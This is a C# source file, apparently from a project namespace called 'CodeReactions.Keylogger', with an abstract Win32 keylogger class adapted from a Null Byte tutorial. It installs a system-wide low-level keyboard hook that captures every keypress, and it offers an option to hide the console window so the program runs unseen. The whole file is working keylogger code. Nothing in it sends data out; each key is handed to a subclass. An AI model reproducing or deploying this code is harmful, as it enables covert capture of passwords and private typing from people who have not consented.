using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace CodeReactions.Keylogger
{
	// Lifted from:
	// http://null-byte.wonderhowto.com/how-to/create-simple-hidden-console-keylogger-c-sharp-0132757/
	public abstract class Win32Keylogger
		: Keylogger
	{
		protected Win32Keylogger()
			: base()
		{
			this.HookId = Win32Keylogger.SetHook(this.LowLevelKeyboardProc);
		}

		protected Win32Keylogger(WindowVisibilityState windowState)
			: this()
		{
			if (windowState == WindowVisibilityState.Hidden)
			{
				Win32.ShowWindow(Win32.GetConsoleWindow(), Win32.SW_HIDE);
			}
		}

		public override void Dispose()
		{
			Win32.UnhookWindowsHookEx(this.HookId);
		}

		public IntPtr LowLevelKeyboardProc(
			 int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)Win32.WM_KEYDOWN)
			{
				var keyCode = (Keys)Marshal.ReadInt32(lParam);
				this.HandleKey(keyCode);
			}

			return Win32.CallNextHookEx(this.HookId, nCode, wParam, lParam);
		}

		private static IntPtr SetHook(Win32.LowLevelKeyboardProc proc)
		{
			using (var process = Process.GetCurrentProcess())
			{
				using (var module = process.MainModule)
				{
					return Win32.SetWindowsHookEx(Win32.WH_KEYBOARD_LL, proc,
						Win32.GetModuleHandle(module.ModuleName), 0);
				}
			}
		}

		public IntPtr HookId { get; private set; }
	}
}
